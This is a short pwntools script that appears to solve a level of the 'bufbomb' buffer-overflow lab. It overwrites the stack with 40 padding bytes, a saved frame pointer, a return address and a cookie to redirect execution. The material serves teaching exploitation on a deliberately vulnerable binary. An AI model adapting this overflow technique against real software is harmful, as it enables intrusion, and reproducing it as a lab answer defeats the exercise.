from pwn import *

f = open("./ID", "r")
id = f.read().splitlines()[0]
f.close()

sh = process(['./bufbomb', '-u', id])

ret = 0x08048cc0
cookie = 0x274adc8a
ebp = 0x556834a0

exploit = flat(['a' * 40, ebp, ret, cookie])

sh.sendline(exploit)

sh.interactive()
